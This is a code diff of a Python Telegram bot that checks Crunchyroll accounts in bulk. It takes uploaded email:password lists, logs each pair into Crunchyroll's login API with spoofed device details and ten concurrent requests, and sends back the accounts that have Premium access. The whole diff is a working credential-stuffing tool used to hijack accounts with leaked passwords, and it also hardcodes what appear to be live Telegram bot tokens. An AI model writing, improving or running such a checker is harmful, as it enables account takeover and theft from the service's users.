@@ -7,7 +7,7 @@ import urllib.parse
 import threading
 
 # Initialize the bot with your token
-bot_token = "6743674131:AAFxWzfagkFlNUCM5uzRuaoj4mBmrmOotYs"
+bot_token = "7468947655:AAGKq2f_dxG0-31WCWKQHWbIYY8-twG7lDE"
 bot = telebot.TeleBot(bot_token)
 
 # Headers and API details for Crunchyroll
@@ -26,13 +26,35 @@ country_codes = {
 
 # Dictionary to track ongoing processes
 user_processing_state = {}
-loop = asyncio.get_event_loop()
 
-# Global aiohttp session for reuse
-session = aiohttp.ClientSession()
+# Start Command
+@bot.message_handler(commands=["start"])
+def send_welcome(message):
+    bot.reply_to(
+        message,
+        (
+            "Welcome to the *Crunchy Bot!*\n\n"
+            "*Commands:*\n"
+            "*/check email:password* - Check a single account\n"
+            "*/mass* - Upload a .txt file with email:password pairs for bulk checking\n"
+            "*/stop* - Stop the ongoing process\n\n"
+            "*The bot will only send results for Premium accounts.*"
+        ),
+        parse_mode="Markdown",
+    )
+
+# Stop Command
+@bot.message_handler(commands=["stop"])
+def handle_stop(message):
+    user_id = message.chat.id
+    if user_id in user_processing_state:
+        user_processing_state[user_id] = False
+        bot.send_message(user_id, "🛑 Process stopped successfully!")
+    else:
+        bot.send_message(user_id, "⚠️ No process is running to stop.")
 
 # Function to Check Single Email:Password (Asynchronous)
-async def check_account(email, password):
+async def check_account(session, email, password):
     guid = str(uuid.uuid4())  # Generate unique device ID
     encoded_email = urllib.parse.quote_plus(email)
     encoded_password = urllib.parse.quote_plus(password)
@@ -41,6 +63,7 @@ async def check_account(email, password):
     data = f"username={encoded_email}&password={encoded_password}&grant_type=password&scope=offline_access&device_id={guid}&device_name=SM-G988N&device_type=samsung%20SM-G977N"
 
     try:
+        # Make the API call
         async with session.post(api_url, data=data, headers=headers) as response:
             if response.status == 401:
                 return "bad"  # Login failed
@@ -71,36 +94,27 @@ async def check_account(email, password):
     except Exception:
         return "bad"
 
-# Limit concurrency to avoid overwhelming the API
-semaphore = asyncio.Semaphore(10)
+# Single Check Command
+@bot.message_handler(commands=["check"])
+def handle_check(message):
+    try:
+        args = message.text.split(" ", 1)[1]
+        email, password = args.split(":")
+        # Run the check in a separate thread
+        threading.Thread(target=run_check, args=(message.chat.id, email, password)).start()
+    except IndexError:
+        bot.send_message(message.chat.id, "Invalid format. Use `/check email:password`.", parse_mode="Markdown")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {str(e)}", parse_mode="Markdown")
 
-async def process_pair(user_id, email, password, sent_message, counters):
-    async with semaphore:
-        if not user_processing_state.get(user_id, False):
-            return
-        try:
-            result = await check_account(email, password)
-            if result == "bad":
-                counters["bad"] += 1
-            else:
-                counters["premium"] += 1
-                bot.send_message(user_id, result, parse_mode="Markdown")
-
-            # Update Inline Keyboard
-            markup = InlineKeyboardMarkup(row_width=2)
-            markup.add(
-                InlineKeyboardButton(f"Total: {counters['total']}", callback_data="total"),
-                InlineKeyboardButton(f"Premium: {counters['premium']}", callback_data="premium"),
-                InlineKeyboardButton(f"Bad: {counters['bad']}", callback_data="bad"),
-                InlineKeyboardButton("🛑 Stop", callback_data="stop"),
-            )
-            bot.edit_message_reply_markup(
-                chat_id=user_id,
-                message_id=sent_message.message_id,
-                reply_markup=markup,
-            )
-        except Exception as e:
-            print(f"Error: {e}")  # Log errors for debugging
+def run_check(chat_id, email, password):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    result = loop.run_until_complete(check_account(aiohttp.ClientSession(), email, password))
+    if result != "bad":
+        bot.send_message(chat_id, result, parse_mode="Markdown")
+    else:
+        bot.send_message(chat_id, "❌ No Premium Account Found.", parse_mode="Markdown")
 
 # Mass Check Command
 @bot.message_handler(commands=["mass"])
@@ -125,7 +139,6 @@ def handle_file_upload(message):
         user_processing_state[user_id] = True
 
         # Initialize Inline Keyboard with Stop Button
-        counters = {"total": total_accounts, "premium": 0, "bad": 0}
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton(f"Total: {total_accounts}", callback_data="total"),
@@ -135,14 +148,53 @@ def handle_file_upload(message):
         )
         sent_message = bot.send_message(message.chat.id, "🔄 Processing accounts...", reply_markup=markup)
 
-        # Start processing
-        asyncio.run(run_mass_check(user_id, pairs, sent_message, counters))
+        # Start a new thread for mass checking
+        threading.Thread(target=run_mass_check, args=(user_id, pairs, sent_message)).start()
 
     except Exception as e:
         bot.send_message(message.chat.id, f"Error processing file: {str(e)}", parse_mode="Markdown")
 
-async def run_mass_check(user_id, pairs, sent_message, counters):
-    tasks = [process_pair(user_id, *pair.split(":"), sent_message, counters) for pair in pairs if ":" in pair]
+async def mass_check(user_id, pairs, sent_message):
+    total_accounts = len(pairs)
+    premium_accounts = 0
+    bad_accounts = 0
+
+    # Limit concurrency to avoid overwhelming the API
+    semaphore = asyncio.Semaphore(10)  # Adjust this value based on API rate limits
+
+    async def process_pair(pair):
+        nonlocal premium_accounts, bad_accounts
+        async with semaphore:
+            if not user_processing_state.get(user_id, False):
+                return
+
+            try:
+                email, password = pair.split(":")
+                result = await check_account(aiohttp.ClientSession(), email, password)
+                if result == "bad":
+                    bad_accounts += 1
+                else:
+                    premium_accounts += 1
+                    bot.send_message(user_id, result, parse_mode="Markdown")
+
+                # Update Inline Keyboard
+                markup = InlineKeyboardMarkup(row_width=2)
+                markup.add(
+                    InlineKeyboardButton(f"Total: {total_accounts}", callback_data="total"),
+                    InlineKeyboardButton(f"Premium: {premium_accounts}", callback_data="premium"),
+                    InlineKeyboardButton(f"Bad: {bad_accounts}", callback_data="bad"),
+                    InlineKeyboardButton("🛑 Stop", callback_data="stop"),
+                )
+                bot.edit_message_reply_markup(
+                    chat_id=user_id,
+                    message_id=sent_message.message_id,
+                    reply_markup=markup,
+                )
+            except ValueError:
+                pass  # Skip invalid formats
+
+    # Run all pairs concurrently
+    tasks = [process_pair(pair) for pair in pairs]
     await asyncio.gather(*tasks)
 
     if user_processing_state.get(user_id, False):
@@ -151,13 +203,21 @@ async def run_mass_check(user_id, pairs, sent_message, counters):
         bot.send_message(user_id, "🛑 Process stopped by user.")
     user_processing_state.pop(user_id, None)
 
-# Cleanly close session on exit
-def cleanup():
-    loop.run_until_complete(session.close())
-    loop.close()
+def run_mass_check(user_id, pairs, sent_message):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(mass_check(user_id, pairs, sent_message))
 
-import atexit
-atexit.register(cleanup)
+# Callback Query Handler for Inline Buttons
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    user_id = call.message.chat.id
+    if call.data == "stop":
+        if user_id in user_processing_state:
+            user_processing_state[user_id] = False
+            bot.answer_callback_query(call.id, "🛑 Process stopped successfully!")
+        else:
+            bot.answer_callback_query(call.id, "⚠️ No process is running to stop.")
 
 # Run Bot Polling
 bot.polling()
